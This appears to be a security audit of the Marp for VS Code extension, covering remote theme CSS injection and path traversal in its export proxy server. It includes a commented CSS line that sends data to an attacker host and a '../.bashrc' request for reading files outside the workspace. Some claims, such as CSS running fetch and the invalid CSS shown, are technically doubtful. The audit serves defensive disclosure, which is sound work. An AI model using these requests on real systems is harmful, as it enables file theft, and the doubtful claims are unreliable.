## Vulnerability List

### 1. Remote Theme CSS Injection

- **Vulnerability Name:** Remote Theme CSS Injection
- **Description:**
    - The Marp for VS Code extension allows users to specify custom themes via the `markdown.marp.themes` setting.
    - This setting can accept remote URLs pointing to CSS files.
    - If a user adds a malicious URL to this setting, the extension will fetch and apply the CSS from that URL in the Marp preview and during export.
    - A malicious CSS file could manipulate the rendered HTML in the preview to perform actions like:
        - Stealing user data displayed in the slides by exfiltrating content via CSS selectors and `fetch` requests in injected JavaScript (if HTML is enabled or if browser rendering engine vulnerabilities are present).
        - Phishing attacks by overlaying fake UI elements on top of the preview.
        - Redirecting users to malicious websites by manipulating links or using CSS-based redirects if HTML is enabled or if browser rendering engine vulnerabilities are present.
        - Triggering XSS if the preview rendering engine has any vulnerabilities that can be exploited through CSS.
    - The vulnerability is triggered when the extension loads and applies the malicious remote theme CSS when a Marp Markdown document is previewed or exported.
- **Impact:**
    - **High**: An attacker could potentially execute malicious code within the VS Code environment of a user who previews or exports a Marp Markdown document after adding a malicious remote theme URL to their settings. This could lead to data theft, phishing, or other malicious activities within the user's VS Code session.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - **Workspace Trust:** The documentation mentions Workspace Trust, and features related to custom themes are marked with a shield icon üõ°Ô∏è. In untrusted workspaces, certain features might be restricted. However, source code analysis of `src/option.ts`, `src/extension.ts`, and `src/themes.ts` and test file `export.test.ts` does not reveal explicit code that disables remote theme loading or restricts functionality related to custom themes in untrusted workspaces. Workspace Trust might provide a general security boundary, but specific enforcement for remote themes is not evident in the provided code. Test file `export.test.ts` includes tests for workspace trust, but these tests only verify that an error message is shown and the `workbench.trust.manage` command is executed when workspace is untrusted, not that remote themes are disabled.
    - **Content Security Policy (CSP) in Preview:**  It's not clear from the provided files if a Content Security Policy is implemented in the Marp preview to restrict the capabilities of loaded CSS and prevent execution of inline scripts or loading of external resources from within the preview.  Analysis of `src/preview.ts` and `src/extension.ts` does not show any CSP implementation.
- **Missing Mitigations:**
    - **Input validation and sanitization:** The extension should validate and sanitize URLs provided in the `markdown.marp.themes` setting to ensure they are valid URLs and potentially block URLs from suspicious domains or schemes.
    - **CSP Implementation:** Implement a strict Content Security Policy for the Marp preview to restrict the capabilities of loaded CSS, preventing inline script execution, form submissions, and potentially restrict network requests initiated from within the preview.
    - **Workspace Trust Enforcement for Remote Themes:**  Explicitly disable or significantly restrict the loading of remote themes when the workspace is not trusted. Provide clear UI indications to the user about the risks of enabling remote themes in untrusted workspaces.
    - **Warning to User:** When a remote theme is loaded, display a clear warning to the user indicating that remote CSS is being applied and that they should only load themes from trusted sources.
- **Preconditions:**
    - The attacker needs to convince a user to add a malicious URL to the `markdown.marp.themes` setting in VS Code. This could be achieved through social engineering, by including a malicious URL in a tutorial, or by exploiting other vulnerabilities to modify the user's VS Code settings.
    - The user must preview a Marp Markdown document or use the export functionality after adding the malicious theme URL.
- **Source Code Analysis:**
    - **`File: /code/src/themes.ts`:**
        ```typescript
        import { fetch, marpConfiguration, readFile } from './utils'
        // ...
        private async registerTheme(themeUri: Uri): Promise<Theme> {
            // ...
            const type: ThemeType = (() => {
                if (themeUri.scheme === 'file') return ThemeType.File
                if (isRemotePath(themeUri)) return ThemeType.Remote
                return ThemeType.VirtualFS
            })()

            const css = await (async (): Promise<string> => {
                switch (type) {
                    case ThemeType.Remote:
                        return await fetch(themePath, { timeout: 5000 }) // Fetches remote CSS
                    default:
                        return await readFile(themeUri)
                }
            })()
            // ...
        }
        ```
        - The `registerTheme` function in `src/themes.ts` is responsible for loading theme CSS.
        - It uses the `fetch` utility function to retrieve CSS content from remote URLs when `themeUri.scheme` is 'http' or 'https'.
        - The fetched CSS content is then directly used in the `Theme` object without any sanitization or security checks.
    - **`File: /code/src/option.ts`:**
        ```typescript
        export const marpCoreOptionForPreview = (
          baseOption: Options & MarpOptions,
        ): MarpOptions => {
          // ...
          cachedPreviewOption = {
            // ...
            minifyCSS: false, // Minification is disabled for preview, making injection easier to read in source
            script: false,    // Script is disabled by default, but CSS injection can still be harmful
            // ...
          }
          return cachedPreviewOption
        }
        ```
        - The `marpCoreOptionForPreview` function sets up options for Marp Core used in the preview. `script: false` disables JavaScript execution by Marp itself, but doesn't prevent malicious JavaScript injection via CSS if HTML is enabled or if browser or rendering engine vulnerabilities are present. `minifyCSS: false` makes it easier to inject readable malicious CSS.
    - **`File: /code/src/extension.ts`:**
        ```typescript
        import themes, { Themes } from './themes'
        // ...
        Promise.all(
            themes.loadStyles(baseFolder).map((p) =>
              p.then(
                (theme) => theme.registered,
                (e) => console.error(e),
              ),
            ),
          ).then((registered) => {
            if (registered.some((f) => f === true)) {
              commands.executeCommand('markdown.preview.refresh')
            }
          })

          for (const theme of themes.getRegisteredStyles(baseFolder)) {
            try {
              marp.themeSet.add(theme.css) // Adds loaded CSS to Marp themeSet
            } catch (e) {
              // ...
            }
          }
          // ...
          const style = marp.renderStyle(marp.lastGlobalDirectives.theme) // Renders style with loaded themes
          const html = markdown.renderer.render(tokens, markdown.options, env)

          return `<style id="__marp-vscode-style">${style}</style>${html}` // Injects style into preview HTML
        ```
        - `extension.ts` loads themes using `themes.loadStyles` and adds them to Marp's theme set.
        - The loaded CSS is directly injected into the preview HTML via `<style>` tag.
- **Security Test Case:**
    1. Create a malicious CSS file hosted on a public server (e.g., using a service like GitHub Gist or a simple HTTP server). This CSS file should contain code to demonstrate the vulnerability. For example, to test for basic CSS injection and exfiltration, the CSS could contain:
       ```css
       body::after {
           content: 'Injected CSS';
           position: fixed;
           top: 0;
           left: 0;
           background-color: red;
           color: white;
           padding: 10px;
           z-index: 9999;
       }
       /* Example of potential data exfiltration if HTML is enabled and script is possible via vulnerabilities */
       /* body::before { */
       /*     content: url("https://attacker.com/exfiltrate?data=" attr(data-content)); */
       /*     display: none; */
       /*     data-content: 'Test Data'; */
       /* } */
       ```
    2. Open VS Code and go to settings (`Ctrl+,` or `Cmd+,`).
    3. Search for `markdown.marp.themes` and click "Edit in settings.json".
    4. Add the URL of the malicious CSS file to the `markdown.marp.themes` array in your `settings.json` file. For example:
       ```json
       {
           "markdown.marp.themes": [
               "https://gist.githubusercontent.com/your-username/your-gist-id/raw/malicious.css"
           ]
       }
    5. Open or create a new Marp Markdown file (a Markdown file with `marp: true` in the front-matter).
    6. Open the Marp preview for this Markdown file.
    7. Observe the preview. If the CSS injection is successful, you should see the "Injected CSS" message (or other effects defined in your malicious CSS) in the preview.
    8. To further test, you can modify the malicious CSS to attempt more sophisticated attacks like phishing UI overlays or data exfiltration (if HTML is enabled and other vulnerabilities exist).

### 2. Insecure Workspace Proxy Server Enabling Directory Traversal and Unauthorized File Access

- **Vulnerability Name:** Insecure Workspace Proxy Server Enabling Directory Traversal and Unauthorized File Access
- **Description:**
    - The extension‚Äôs HTTP proxy server (located in `workspace-proxy-server.ts`) is used during export operations to handle resource requests from within a workspace.
    - When a GET request is handled, the code joins the workspace folder‚Äôs URI with a user‚Äëprovided URL pathname without explicitly validating or sanitizing it.
    - This omission permits path traversal (for example, using ‚Äú../‚Äù sequences) that can force the resolved URI outside the intended workspace folder.
    - An attacker who is able to send HTTP requests to this proxy endpoint (for example, because of network misconfiguration or container exposure) could supply a crafted path, causing the proxy to read and return arbitrary local filesystem contents.
    - The vulnerability is triggered when a user exports a Marp Markdown document to PDF, PPTX, PNG, or JPEG, which starts the workspace proxy server.
- **Impact:**
    - **Critical**: An attacker with access to the proxy server (even though it is by default bound to 127.0.0.1, misconfigurations or certain deployment setups might expose it externally) could retrieve sensitive files from the local filesystem. This could lead to the unintended exposure of credentials, configuration files, or proprietary source code. Successful path traversal could allow an attacker to read arbitrary files from the user's file system that are accessible to the VS Code process, potentially including sensitive information, configuration files, or source code from outside the intended workspace.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - **Loopback Binding:** The proxy server is bound to the loopback interface (127.0.0.1) to limit access to local processes only.
    - **`Uri.joinPath` Usage:** The code uses `Uri.joinPath(workspaceFolder.uri, url.pathname)` to combine the incoming request‚Äôs pathname with the workspace folder‚Äôs URI.
    - *(Note: These measures do not explicitly validate or sanitize dangerous path sequences, and as such, are insufficient when an attacker can control the request data.)*
- **Missing Mitigations:**
    - **Path Sanitization and Validation:** Implement robust path sanitization and validation in the proxy server to prevent path traversal. This could include:
        - Checking if the resolved `vscodeUri` is still within the `workspaceFolder.uri` using a function like `isDescendant` or by comparing path prefixes after resolving both paths to their absolute forms.
        - Rejecting requests where `url.pathname` contains path traversal sequences like `..` or attempts to go above the workspace root.
        - Using a safe path joining mechanism that prevents traversal, or carefully validating the output of `Uri.joinPath`.
    - **Workspace Folder Restriction:** Explicit check to ensure that the resolved URI remains within the intended workspace folder.
    - **Input Sanitization:** No sanitization or normalization is performed on the user‚Äësupplied URL path (for example, to detect and reject ‚Äú../‚Äù sequences).
    - **Access Control:** There is no additional access control (such as authentication or IP filtering) on the proxy endpoint.
- **Preconditions:**
    - An export operation is triggered (for instance, by opening a Markdown document with Marp frontmatter), which causes the proxy server to start.
    - The document is associated with a workspace folder.
    - An attacker must be able to send crafted HTTP requests to the proxy endpoint (e.g. due to misconfigurations that expose the proxy, or local access).
    - The attacker needs to know or guess the port number of the proxy server.
- **Source Code Analysis:**
    - **`File: /code/src/workspace-proxy-server.ts`:**
        ```typescript
        import { FileType, Uri, workspace, WorkspaceFolder } from 'vscode'
        // ...
        export const createWorkspaceProxyServer = async (
          workspaceFolder: WorkspaceFolder,
        ): Promise<WorkspaceProxyServer> => {
          // ...
          const app = express().get('*', async (req, res) => {
            const url = new URL(req.url, `http://${req.headers.host}`)
            const vscodeUri = workspaceFolder.uri.with({
              fragment: url.hash,
              path: Uri.joinPath(workspaceFolder.uri, url.pathname).path, // Potentially vulnerable path join
              query: url.search,
            })
            // ...
          }
          // ...
        }
        ```
        - The `createWorkspaceProxyServer` function sets up an Express server.
        - Inside the `get('*', ...)` route handler, `Uri.joinPath` is used to combine `workspaceFolder.uri` and `url.pathname` from the request to construct the `vscodeUri`.
        - There is no sanitization or validation of `url.pathname` before using `Uri.joinPath`. This allows for path traversal if `url.pathname` contains malicious sequences.
        - The code later checks for file existence using `workspace.fs.stat(vscodeUri)` and reads the file‚Äôs contents if found, potentially returning data from unintended filesystem locations.
- **Security Test Case:**
    1. In a controlled testing environment, open a workspace (e.g. `/home/user/project`) in VS‚ÄØCode and open a Markdown document that includes Marp frontmatter (e.g. a header containing `---\nmarp: true\n---`), so that an export operation is initiated and the workspace proxy server starts. Ensure this is a **trusted workspace**.
    2. Determine (or capture from logs) the proxy server‚Äôs port number.
    3. Using a tool such as curl or Postman, send an HTTP GET request to a URL like:
       ```
       http://127.0.0.1:<port>/../.bashrc
       ```
       (Ensure that the ‚Äú../‚Äù sequence is URL‚Äëencoded if necessary.)
    4. If the vulnerability is present, the proxy server will resolve the path to a file outside the workspace (in this example, the user‚Äôs `.bashrc`) and return its contents in the HTTP response.
    5. After adding proper path sanitization (for example, verifying that the resolved path is within the workspace folder), the same request should be rejected (e.g. returning a 404 or error message).
